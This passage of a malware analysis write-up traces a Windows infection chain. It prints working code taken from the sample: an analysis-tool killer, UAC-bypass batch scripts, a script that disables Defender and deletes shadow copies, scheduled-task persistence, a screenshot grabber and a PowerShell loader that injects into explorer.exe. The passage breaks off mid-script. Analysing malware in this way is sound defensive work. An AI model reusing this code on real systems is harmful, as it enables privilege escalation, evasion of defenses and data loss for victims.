    private static bool IsTargetProcess(string processName)
    {
        return processName.EndsWith("watcher.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("ProcessHacker.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("mitmdump.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("mitmproxy.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("mitmweb.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("Insomnia.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("HTTP Toolkit.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("Charles.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("Postman.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("BurpSuiteCommunity.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("Fiddler Everywhere.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("Fiddler.WebUi.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("HTTPDebuggerUI.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("HTTPDebuggerSvc.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("HTTPDebuggerPro.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("Progress Telerik Fiddler Web Debugger.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("HTTP Debugger Pro.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("Fiddler.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("FolderChangesView.exe", StringComparison.OrdinalIgnoreCase) ||
            processName.EndsWith("Wireshark.exe", StringComparison.OrdinalIgnoreCase);
    }

    private static void KillProcess(uint processId)
    {
        IntPtr processHandle = OpenProcess(0x0001, false, processId);
        TerminateProcess(processHandle, 0);
        CloseHandle(processHandle);
    }

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);

    [DllImport("kernel32.dll")]
    private static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport("kernel32.dll")]
    private static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport("kernel32.dll")]
    private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr handle);

    [DllImport("kernel32.dll")]
    private static extern bool TerminateProcess(IntPtr hProcess, int exitCode);

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESSENTRY32
    {
        public uint dwSize;
        public uint cntUsage;
        public uint th32ProcessID;
        public IntPtr th32DefaultHeapID;
        public uint th32ModuleID;
        public uint cntThreads;
        public uint th32ParentProcessID;
        public int pcPriClassBase;
        public uint dwFlags;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szExeFile;
    }
}
"@
Add-Type -TypeDefinition $code -Language CSharp;[AntiProcess]::StartBlocking();Start-Sleep -Seconds 60;[AntiProcess]::StopBlocking()
```

Then `m1zuvlzv.cmdline` and `m1zuvlzv.cs` are dropped in the users temp directory. 

The malware then proceeds to run `csc.exe`, the C# compiler, on the dropped file `m1zuvlzv.cmdline`, containing the AntiProcess C# code from earlier. This then outputs `C:\Users\admin\AppData\Local\Temp\m1zuvlzv.dll` after compilation.
```
"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\admin\AppData\Local\Temp\m1zuvlzv.cmdline"
```
Taking a closer look at `m1zuvlzv.cmd`:
```
/t:library /utf8output /R:"System.dll" /R:"C:\WINDOWS\Microsoft.Net\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll" /R:"System.Core.dll" /out:"C:\Users\admin\AppData\Local\Temp\m1zuvlzv.dll" /debug- /optimize+ /warnaserror /optimize+  "C:\Users\admin\AppData\Local\Temp\m1zuvlzv.0.cs"
```
It appears to be parameters for the compiler, looking for the source, we find `m1zuvlzv.cs`. This contains the same C# source code found earlier for the debug/analysis process blocker.

```
using System;
using System.Runtime.InteropServices;
using System.Threading;

public static class AntiProcess
{
    private static Thread blockThread = new Thread(BlockProcess);
    public static bool IsEnabled { get; set; }

    public static void StartBlocking()
    {
        IsEnabled = true;
        blockThread.Start();
    }
...<SNIP>...
    public struct PROCESSENTRY32
    {
        public uint dwSize;
        public uint cntUsage;
        public uint th32ProcessID;
        public IntPtr th32DefaultHeapID;
        public uint th32ModuleID;
        public uint cntThreads;
        public uint th32ParentProcessID;
        public int pcPriClassBase;
        public uint dwFlags;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szExeFile;
    }
}
```


More recon is now preformed, enumerating any active sessions with the machine:
```
C:\WINDOWS\system32\cmd.exe /d /s /c "net session"
```

At this point, `SearchFilter.exe` creates the `Microsoft\WindowsApps` directories within the users temp directory, potentially setting up for a UAC bypass. It then drops another two files: a `b.bat` batch script and a `service.exe` binary disguised as the legitimate Windows binary `Wextract`.

We first inspect `b.bat`. 
```
@echo off
set PLD=C:\Users\admin\AppData\Local\Microsoft\WindowsApps\Service.exe
net session >nul 2>&1 || goto :chk
%PLD%
exit /b 2

:chk
whoami /groups | findstr /i "\<S-1-5-32-544\>" >nul 2>&1
if ERRORLEVEL 1 exit /b 1
for /f "tokens=4-5 delims=. " %%i in ('ver') do set WV=%%i.%%j
set key="HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"
for /f "skip=2 tokens=3" %%u in ('REG QUERY %key% /v ConsentPromptBehaviorAdmin') do set /a "UAC=%%u"
if %UAC% equ 2 exit /b 1
if %UAC% equ 5 (
    for %%v in (6.1 6.2 6.3) do if "%WV%" == "%%v" call :exp mscfile CompMgmtLauncher.exe %PLD%
    if "%WV%" == "10.0" call :exp ms-settings ComputerDefaults.exe %PLD%
) >nul 2>&1
if %UAC% equ 0 powershell -c Start-Process "%PLD%" -Verb runas
exit /b 0
:exp <key> <trg> <pld>
set regPth="HKCU\Software\Classes\%1\shell\open\command"
reg add %regPth% /d "%~3" /f
reg add %regPth% /v DelegateExecute /f
%~2
reg delete "HKCU\Software\Classes\%1" /f
exit /b
```
Lets break down what this script is doing:
1. It first checks if its being run with Administrator privileges with `net session >nul 2>&1 || goto :chk`, if this check fails, it will jump to `:chk`. If this check succeeds(returns 0), then `%PLD%`(`Service.exe`) is executed and the batch script is exited. 
2. It then enumerates the users joined groups with `whoami /groups` and searches for the string `S-1-5-32-544`, this string is the [SUID](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers) for the Administrators group. If `ERRORLEVEL 1`, meaning the user is not a member of the Administrators group, the script will simply exit. 
3. If the user is apart of the Administrator group but does not currently have Administrator privileges, a UAC bypass is attempted to escalate privileges via modifying `regPth="HKCU\Software\Classes\%1\shell\open\command`. %1 can be `mscfile` or `ms-settings` depending on Windows version. This is done by first checking the version of Windows through the `ver` command and then checking the UAC version by querying the registry value `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin`. 
	- If UAC is set to 2(ALWAYS NOTIFY), the script will exit as it cannot silently elevate privileges. 
	- If UAC is set to 5(Prompt for Credentials), the script leverages known UAC bypass exploits depending on the Windows version. On [Windows 7,8, and 8.1](https://github.com/yo-yo-yo-jbo/uac_bypasses?tab=readme-ov-file#hkcu-and-file-associations): Modified file association of `mscfile` with the auto-elevated executable `CompMgmtLauncher.exe`. On [Windows 10](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md#atomic-test-5---bypass-uac-using-computerdefaults-powershell): Modified file association of `HKCU:\software\classes\ms-settings` with `ComputerDefaults.exe`.
	- if UAC is set to 0(DISABLED), the `Service.exe` process is simply ran with `-Verb runas`.
4. Finally, the script cleans up by the deleting the registry key it added under `HKCU\Software\Classes\...`

Upon startup of the malicious `Service.exe`, it drops the `babel.bat` batch file. 
```
@echo off

PowerShell -NoProfile -ExecutionPolicy Bypass -Command ^

"$defenderExclusions = Get-MpPreference; ^

$defenderExclusions.ExclusionPath = $defenderExclusions.ExclusionPath + 'C:\'; ^

Set-MpPreference -ExclusionPath $defenderExclusions.ExclusionPath"

reg.exe ADD HKCU\Software\Policies\Microsoft\Windows Defender Security Center\Notifications /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f

reg.exe ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Microsoft.WindowsDefender.SecurityCenter.Notifications /v Enabled /t REG_DWORD /d 0 /f

reg.exe ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\WindowsDefenderSecurityCenter /v Enabled /t REG_DWORD /d 0 /f

reg.exe ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance /v Enabled /t REG_DWORD /d 0 /f

reg.exe ADD HKCU\Software\Microsoft\Windows\CurrentVersion\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f

reg.exe ADD HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile /v DisableNotifications /t REG_DWORD /d 1 /f

reg.exe ADD HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile /v DisableNotifications /t REG_DWORD /d 1 /f

reg.exe ADD HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\PublicProfile /v DisableNotifications /t REG_DWORD /d 1 /f

reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Notifications /v SCNotifyEnabled /t REG_DWORD /d 0 /f

reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f

schtasks /create /tn "\Microsoft\Windows\Device Guide\RegisterDeviceSecurityAlert" /tr "powershell -ExecutionPolicy Bypass -File "%localappdata%\Programs\Common\NUL\mbam.ps1"" /sc once /st 00:00 /du 9999:59 /ri 58 /ru "SYSTEM" /RL HIGHEST /F

schtasks /create /tn "\Microsoft\Windows\Device Guide\RegisterDevicePowerStateChange" /tr "C:\ProgramData\MicrosoftTool\current\Microsoft.exe" /sc once /st 00:00 /du 9999:59 /ri 60 /RL HIGHEST /F

vssadmin delete shadows /for=c: /all /quiet

net stop VSS /y

REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /f /v DisableSR /t REG_DWORD /d 1

REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /f /v DisableConfig /t REG_DWORD /d 1

exit /b 0
```
Taking a closer look at `babel.bat`, we note that this script is incredibly dangerous and does the following:
1. The script first gets the preferences for Windows Defender, including the exclusions. Then it proceeds to add the entire `C:\` drive to the exclusion list. This will effictively stop Windows Defender from monitoring or scanning anything within the `C:\` drive. 
2. All Windows Defender(and `Windows.SystemToast.SecurityAndMaintenance`) related notifications are then completely disabled and suppressed by modifying their respective registry keys. This prevents any security related alerts to the user, likely because the tasks that follow would have caused alerts.
3. Next, all Windows Firewall related notifications are completely disabled for Domain, Private, and Public profiles. Just like before, this will suppress any alerts to the user of potentially harmful network changes or activity. 
4. Through another registry key edit, the script then sets `EnableLUA` to 0. [This setting](https://learn.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-lua-settings-enablelua) disables any UAC prompts or notifications, efficiently disabling User Account Controls (UAC) and allowing applications to be run with elevated privileges without the user accepting a prompt.
5. Two scheduled tasks are then created:
	- The first task named `\Microsoft\Windows\Device Guide\RegisterDeviceSecurityAlert` will run the `mbam.ps1` script located at `%localappdata%\Programs\Common\NUL\`. This is only run once at 00:00 for a duration of 9999 hours 59 minutes and is repeated every 58 minutes. The task runs as the `SYSTEM` user with the `HIGHEST` RunLevel(According to the [Windows Documentation](https://learn.microsoft.com/en-us/windows/win32/taskschd/taskschedulerschema-runlevel-principaltype-element), this means the task will run with elevated privileges). Finally the `/F` flag forcefully creates the task and will supress any warnings if the task already existed. See [schtasks](https://learn.microsoft.com/en-us/windows/win32/taskschd/schtasks) documentation for more information relating to each parameter. 
	- The second task named `\Microsoft\Windows\Device Guide\RegisterDevicePowerStateChange` will run the `C:\ProgramData\MicrosoftTool\current\Microsoft.exe` binary with almost identical parameters to the last task. More research is needed here as this appears to be a Microsoft binary as we did not notice it being dropped or created at any point in the attack chain.
6. The script then uses [vssadmin](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/vssadmin) to silently delete all `C:\` volume shadow copies with `vssadmin delete shadows /for=c: /all /quiet` before completly shutting down the Volume Shadow Copy Service (VSS). This [inhibits system recovery](https://attack.mitre.org/techniques/T1490/) and will prevent the user from restoring the system to a clean, pre-malware state.
7. Finally, `SystemRestore` registry keys are modified to prevent new system restore points from being created. 


From the previous script, we noted that `mbam.ps1` is scheduled to run as `SYSTEM`. Inspecting this reveals its a script that specifically targets the MalwareBytes antivirus however it appears to actually launch the MalwareBytes `mbuns.exe` executable which seems odd. It could be this is just checking for the presence of the executable? Although the path is already tested. Further inspection reveals no modification to the mbuns.exe at this point in the malwares attack chain.
```
$mbunsPath = "C:\Program Files\Malwarebytes\Anti-Malware\mbuns.exe"

if (Test-Path $mbunsPath) {
    $process = Start-Process -FilePath $mbunsPath -ArgumentList "/silent" -Wait -PassThru
    if ($process.ExitCode -ne 0) {
        exit
    }
}
else {
    exit
}
```


Next, the script uses 7z to extract 188 files from the `h0uj0p.7z` archive to `C:\Users\admin\AppData\Local\Microsoft\Vault\UserProfileProgramFiles`:
```
C:\WINDOWS\system32\cmd.exe /d /s /c ""C:\ProgramData\sevenZip\7z.exe" x "C:\Users\admin\AppData\Local\Temp\h0uj0p.7z" -pSaToshi780189.! -o"C:\Users\admin\AppData\Local\Microsoft\Vault\UserProfileProgramFiles" -y"
```
Before further analyzing, the password `SaToshi780189` sticks out, potentially indicating a crypto-miner is present within. Among the 188 files there are dozens of python scripts that appear to be random padding, multiple PowerShell scripts, and 4 executables(`taskhostw.exe`, `python312.dll`,`thumbchace_windows_api.dll`, and `folder_settings.dll`).

From the new files extracted, `FM.ps1` is run.
```
powershell.exe -ExecutionPolicy Bypass -File "C:\Users\admin\AppData\Local\Microsoft\Vault\UserProfileProgramFiles\Folder\FM.ps1" -WindowStyle Hidden
```

Inspecting `FM.ps1`:
```
$set = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Vault\UserProfileProgramFiles\Folder\folder_settings.dll"

Add-Type -Path $set

$sourceFolder = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Vault\UserProfileProgramFiles\clientfiles"

$destinationFolder = "C:\Users\$env:USERNAME\AppData\Local\Programs\Common\NUL"

[FileMover]::Move($sourceFolder, $destinationFolder)
```
The dropped .NET .dll is added to the PowerShell session before  `C:\Users\$env:USERNAME\AppData\Local\Microsoft\Vault\UserProfileProgramFiles\clientfiles` is copied to `C:\Users\$env:USERNAME\AppData\Local\Programs\Common\NUL`.

Next, another 7z archive(`LOG.7z`) is extracted to `C:\Users\admin\AppData\Local\Microsoft\Vault\LOG`
```
C:\WINDOWS\system32\cmd.exe /d /s /c ""C:\ProgramData\sevenZip\7z.exe" x "C:\Users\admin\AppData\Local\Microsoft\Vault\LOG.7z" -o"C:\Users\admin\AppData\Local\Microsoft\Vault\LOG" -y"
```

The attributes are then modified on the previously dropped `thumbchace_windows_api.dll`, setting it to HIDDEN and making it a system file. 
```
C:\WINDOWS\system32\cmd.exe /d /s /c "attrib +h +s "C:\Users\admin\AppData\Local\Microsoft\Windows\Explorer\thumbchace_windows_api.dll""
```

The task `RegisterDeviceNetworkChange` is then queried.
```
C:\WINDOWS\system32\cmd.exe /d /s /c "schtasks /query /TN "Microsoft\Windows\Device Guide\RegisterDeviceNetworkChange" >nul 2>&1"
```


A new task is then forcefully created. This task is named `nul` and is set to execute the previously extracted and moved `taskhostw.exe` executable to run once at 00:08 for 9999 hours and 59 minutes, repeating every 5 minutes.
```
C:\WINDOWS\system32\cmd.exe /d /s /c "schtasks /create /tn nul /tr "C:\Users\admin\AppData\Local\Programs\Common\NUL\taskhostw\taskhostw.exe "C:\Users\admin\AppData\Local\Programs\Common\NUL\taskhostw\taskhostw"" /st 00:08 /du 9999:59 /sc once /ri 5 /f"
```

The task is then manually run:
```
C:\WINDOWS\system32\cmd.exe /d /s /c "schtasks /run /tn "nul""
```

`Runtime Broker.exe`, a file previously extracted from `LOG.7z` is then executed:
```
C:\WINDOWS\system32\cmd.exe /d /s /c "powershell -Command "Start-Process -FilePath \"C:\Users\admin\AppData\Local\Microsoft\Vault\LOG\RuntimeBroker\Runtime Broker.exe\""
```

Upon execution of `Runtime Broker.exe`, it launches itself twice with the following set of parameters:
```
"C:\Users\admin\AppData\Local\Microsoft\Vault\LOG\RuntimeBroker\Runtime Broker.exe" --type=gpu-process --user-data-dir="C:\Users\admin\AppData\Roaming\qnzjclzxfihzlozt" --gpu-preferences=UAAAAAAAAADgAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAABgAAAAAAAAAGAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAACAAAAAAAAAA= --mojo-platform-channel-handle=1960 --field-trial-handle=1964,i,5554170963825907946,11437780809926846697,131072 --disable-features=SpareRendererForSitePerProcess,WinRetrieveSuggestionsOnlyOnDemand /prefetch:2

"C:\Users\admin\AppData\Local\Microsoft\Vault\LOG\RuntimeBroker\Runtime Broker.exe" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --user-data-dir="C:\Users\admin\AppData\Roaming\qnzjclzxfihzlozt" --mojo-platform-channel-handle=2180 --field-trial-handle=1964,i,5554170963825907946,11437780809926846697,131072 --disable-features=SpareRendererForSitePerProcess,WinRetrieveSuggestionsOnlyOnDemand /prefetch:8
```
It then drops the PE32 executables `dcc6e2db-2eda-411f-9044-fc2098cd7898.tmp.node`, `f90fb856-9bab-4c71-8b68-cece340ca872.tmp.node`, and `b54c45b4-b027-4878-815c-dc42c6d4c3b3.tmp.node` into `C:\Users\admin\AppData\Local\Temp\`.


It then runs `chcp` to display the number of active console code page. The code page defines the character set being used by the current console, the default code-page for English is `437`. This could potentially be used to check for region of user before infection.
```
 C:\WINDOWS\system32\cmd.exe /d /s /c "chcp" 
```

A GET request is then made to `http://api.ipify.org/` using `curl`, this is to grab the external IP of the victim machine.
```
C:\WINDOWS\system32\cmd.exe /d /s /c "curl http://api.ipify.org/ --ssl-no-revoke"
```

More recon is done by `Runtime Broker.exe`, this time checking System Management BIOS version. 
```
C:\WINDOWS\system32\cmd.exe /d /s /c "wmic bios get smbiosbiosversion"
```
While this could be useful for general recon, we can probably infer this is to catch virtual machines. Testing on Windows VirtualBox VM:
```
C:\Users\omo>wmic bios get smbiosbiosversion
SMBIOSBIOSVersion
VirtualBox
```

Even more HW enumeration is done, this time checking ram speed. 
```
C:\WINDOWS\system32\cmd.exe /d /s /c "wmic MemoryChip get /format:list | find /i "Speed""
```


Afterwards, we notice something peculiar, `Runtime Broker.exe` actually kill its own PID, forcing `Runtime Broker.exe` to close.
```
C:\WINDOWS\system32\cmd.exe /d /s /c "taskkill /f /pid 4544"
```

With `Runtime Broker.exe` closed, the still running `SearchFilter.exe` continues its execution flow.

Next, another 7z archive `122ae144-0313-4cc4-b39e-40b4a6aa51c4.7z` is extracted to `C:\ProgramData\MicrosoftTool` with the password `somaliMUSTAFA681!!...`
```
C:\WINDOWS\system32\cmd.exe /d /s /c ""C:\ProgramData\sevenZip\7z.exe" x "C:\ProgramData\122ae144-0313-4cc4-b39e-40b4a6aa51c4.7z" -psomaliMUSTAFA681!!... -o"C:\ProgramData\MicrosoftTool" -y"
```

Another dropped script is then executed.
```
C:\WINDOWS\system32\cmd.exe /d /s /c "powershell -ExecutionPolicy Bypass -File "C:\Users\admin\AppData\Local\Temp\script0913.ps1""
```

Analyzing script:
```
$dataPath = "C:\ProgramData\MicrosoftTool" Set-ItemProperty -Path $dataPath -Name Attributes -Value 

([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System) Get-ChildItem -Path 

$dataPath -Recurse -Force | ForEach-Object { Set-ItemProperty -Path $_.FullName -Name Attributes -
Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System) }
```
This script lists all files in `C:\ProgramData\MicrosoftTool` before looping through them and setting their attributes to HIDDEN while also making them system files, likely for concealment purposes.

The previously dropped `Microsoft.exe` is then executed.
```
C:\WINDOWS\system32\cmd.exe /d /s /c "start C:\ProgramData\MicrosoftTool\current\Microsoft.exe"
```

At this point, the malicious `Microsoft.exe` drops `Service.exe` in `C:\Users\Public\Pictures\`
![Service.exe Drop]({{ site.baseurl }}/assets/images/MalAl-IBC/service-drop.png)
Just as we observed in the last two malicious binaries, `Microsoft.exe` launches itself twice, settings its type to a gpu-process.
```
"C:\ProgramData\MicrosoftTool\current\Microsoft.exe" --type=gpu-process --user-data-dir="C:\Users\admin\AppData\Roaming\Teams" --gpu-preferences=UAAAAAAAAADgAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAAAAAAASAAAAAAAAAAYAAAAAgAAABAAAAAAAAAAGAAAAAAAAAAQAAAAAAAAAAAAAAAOAAAAEAAAAAAAAAABAAAADgAAAAgAAAAAAAAACAAAAAAAAAA= --mojo-platform-channel-handle=1692 --field-trial-handle=1796,i,6058612099769198678,15727490221281573474,131072 --disable-features=SpareRendererForSitePerProcess,WinRetrieveSuggestionsOnlyOnDemand /prefetch:2
```

`b.vbs` is then executed.
```
C:\WINDOWS\system32\cmd.exe /d /s /c ""C:\Users\Public\Pictures\b.vbs""
```

Inspecting the visual basics script, we see its launching another batch script, `b.bat`
```
CreateObject("WScript.Shell").Run "C:\Users\Public\Pictures\b.bat", 0, False
```

Inspecting this script, we see its rather similar to the previously analyzed `b.bat` located at  `C:\Users\admin\AppData\Local\Temp\b.bat`, this time launching the `Service.exe` located in `C:\Users\Public\Pictures\Service.exe`.
```
@echo off
set PAYLOAD=C:\Users\Public\Pictures\Service.exe


net session >nul 2>&1 || goto :label
%PAYLOAD% 
exit /b 2


:label
whoami /groups|findstr /i "\<S-1-5-32-544\>" >nul 2>&1
if ERRORLEVEL 1 exit /b 1


for /f "tokens=4-5 delims=. " %%i in ('ver') do set WIN_VER=%%i.%%j



set key="HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System"
for /f "skip=2 tokens=3" %%U in ('REG QUERY %key% /v ConsentPromptBehaviorAdmin') do set /a "UAC=%%U"


if %UAC% equ 2 exit /b 1
if %UAC% equ 5 (
    for %%V in (6.1 6.2 6.3) do if "%WIN_VER%" == "%%V" call :exploit mscfile CompMgmtLauncher.exe %PAYLOAD%
    if "%WIN_VER%" == "10.0" call :exploit ms-settings ComputerDefaults.exe %PAYLOAD%
)>nul 2>&1
if %UAC% equ 0 powershell -c Start-Process "%PAYLOAD%" -Verb runas

exit /b 0

:exploit <key> <trigger> <payload>
set regPath="HKCU\Software\Classes\%1\shell\open\command"
reg add %regPath% /d "%~3" /f
reg add %regPath% /v DelegateExecute /f
%~2
reg delete "HKCU\Software\Classes\%1" /f
exit /b
```

Upon launch of the new `Service.exe`, `C:\Users\admin\AppData\Local\Temp\IXP000.TMP\v2.bat` is executed. Inspecting this reveals yet another scheduled task running with elevated privileges.
```
schtasks /create /tn "\\Microsoft\\Windows\\Device Guide\\RegisterDevicePowerStateChange" /tr "C:\\ProgramData\\MicrosoftTool\\current\\Microsoft.exe" /sc once /st 00:00 /du 9999:59 /ri 60 /RL HIGHEST /
```

Again, another 7z archive is extracted into the users temp directory
```
C:\WINDOWS\system32\cmd.exe /d /s /c ""C:\ProgramData\sevenZip\7z.exe" x "C:\Users\admin\AppData\Local\Temp\6q9opc.7z" -p7KoLumBiyaDTX001!! -o"C:\Users\admin\AppData\Local\Temp\6q9opc" -y"
```
This includes files almost identical to the last archive extracted
![7z Archive Extraction]({{ site.baseurl }}/assets/images/MalAl-IBC/archive-extract.png)

It appears the main purpose of the `Service.exe` runs are to establish persistance by scheduling tasks to run at elevated privileges. `Service.exe` then runs taskkill against itself again. 

With `Service.exe` killed, `SearchFilter.exe` continues. This time executing `CaptureScreens0828.ps1`
```
C:\WINDOWS\system32\cmd.exe /d /s /c "powershell.exe -ExecutionPolicy Bypass -File "C:\Users\admin\AppData\Local\Temp\CaptureScreens0828.ps1""
```

As the name might imply, this script captures screenshots of the victims desktop and stores it in `C:\Users\admin\AppData\Local\Temp\Screenshots`.
```
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$screenWidth = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Width
$screenHeight = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize.Height
$bitmap = New-Object System.Drawing.Bitmap $screenWidth, $screenHeight
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
$outputDir = "C:\Users\admin\AppData\Local\Temp\Screenshots"
$outputPath = "$outputDir\Screenshot.png"
if (-not (Test-Path $outputDir)) {
    New-Item -ItemType Directory -Path $outputDir
}
try {
    $bitmap.Save($outputPath, [System.Drawing.Imaging.ImageFormat]::Png)
} catch {
    Write-Error "Failed to save screenshot: $_"
}
$graphics.Dispose()
$bitmap.Dispose()
```

More HW enumeration is then done, this time checking for CPU core count and GPU name.
```
C:\WINDOWS\system32\cmd.exe /d /s /c "powershell -Command "Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -ExpandProperty NumberOfLogicalProcessors""


C:\WINDOWS\system32\cmd.exe /d /s /c "wmic path Win32_VideoController get Name"
```

More OS version enumeration is conducted:
```
C:\WINDOWS\system32\cmd.exe /d /s /c "powershell -Command "Get-CimInstance -ClassName Win32_OperatingSystem | Select-Object -ExpandProperty Caption""

C:\WINDOWS\system32\cmd.exe /d /s /c "powershell -Command "Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty OSArchitecture""
```

It then enumerates the default selected Anti-Virus product
```
C:\WINDOWS\system32\cmd.exe /d /s /c "wmic /namespace:\\root\SecurityCenter2 path AntivirusProduct get displayName"
```

Finally `SearchFilter.exe` kills its own process.
```
C:\WINDOWS\system32\cmd.exe /d /s /c "taskkill /f /pid 208"
```

Shortly after, the scheduled task `nul` which launched the malicious `taskhostw.exe` located at `C:\Users\admin\AppData\Local\Programs\Common\NUL\taskhostw\taskhostw.exe` begins executing its chain. 

This starts with `boot.ps1` being executed.
```
C:\WINDOWS\system32\cmd.exe /c "powershell.exe -ExecutionPolicy Bypass -File "C:\Users\admin\AppData\Local\Programs\Common\NUL\boot.ps1""
```

boot.ps1
```
$apiPath = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Windows\Explorer\thumbchace_windows_api.dll"

Add-Type -Path $apiPath


function DecryptFile {
    param (
        [string]$inputFilePath,
        [string]$key
    )
    
    [Encryption]::DecryptFile($inputFilePath, $key)
}



$mutexName = "mutex_boot-AXzFmXc6Oe"

$mutexAccess = 0x1F0001

$manifestFile = Join-Path -Path $PSScriptRoot -ChildPath "boot.manifest"

$bootmanifest = "/AhrgEAlWCXcWIDoN2TAINPVUbfO5eQBXTG4X1FIc+w="



try {

    $mutex = [Win32.Kernel32]::OpenMutex($mutexAccess, $false, $mutexName)
    if ($mutex -ne [IntPtr]::Zero) {
        Write-Host ":)"
        [Win32.Kernel32]::CloseHandle($mutex) | Out-Null
    }
    else {
        $finally = DecryptFile -inputFilePath $manifestFile -key $bootmanifest
        $processName = "explorer"
        $processes = Get-Process -Name $processName
        $processId = $processes[0].Id
        $processHandle = [WinAPI]::OpenProcess([WinAPI]::PROCESS_ALL_ACCESS, $false, [UInt32]$processId)
        
        if ($processHandle -eq [IntPtr]::Zero) {
        }
        
        $remoteMem = [WinAPI]::VirtualAllocEx($processHandle, [IntPtr]::Zero, [UInt32]$finally.Length, [WinAPI]::MEM_COMMIT, [WinAPI]::PAGE_EXECUTE_READWRITE)
        
        if ($remoteMem -eq [IntPtr]::Zero) {
            Write-Error "   ."
            [WinAPI]::CloseHandle($processHandle)
        }
        
        $bytesWritten = [IntPtr]::Zero
        $success = [WinAPI]::WriteProcessMemory($processHandle, $remoteMem, $finally, [UInt32]$finally.Length, [ref]$bytesWritten)
        
        if (-not $success -or $bytesWritten -ne [IntPtr]$finally.Length) {
            Write-Error "He     ."
            [WinAPI]::CloseHandle($processHandle)
        }
        $threadHandle = [IntPtr]::Zero
        $threadId = [IntPtr]::Zero
        $threadHandle = [WinAPI]::CreateRemoteThread($processHandle, [IntPtr]::Zero, 0, $remoteMem, [IntPtr]::Zero, 0, [ref]$threadId)
        
        if ($threadHandle -eq [IntPtr]::Zero) {
            Write-Error "He   ."
            [WinAPI]::CloseHandle($processHandle)
        }
        
        [WinAPI]::CloseHandle($threadHandle)
        [WinAPI]::CloseHandle($processHandle)
    }
}

catch {
    Write-Host "Error: $($_)"
}
```
This script attempts to inject into `explorer.exe`

Next, `kernel.ps1` is executed by `taskhostw.exe`
```
C:\WINDOWS\system32\cmd.exe /c "powershell.exe -ExecutionPolicy Bypass -File "C:\Users\admin\AppData\Local\Programs\Common\NUL\kernel.ps1""
```

kernel.ps1:
```
$apiPath = "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Windows\Explorer\thumbchace_windows_api.dll"

Add-Type -Path $apiPath


function DecryptFile {

    param (
        [string]$inputFilePath,
        [string]$key
    )
    
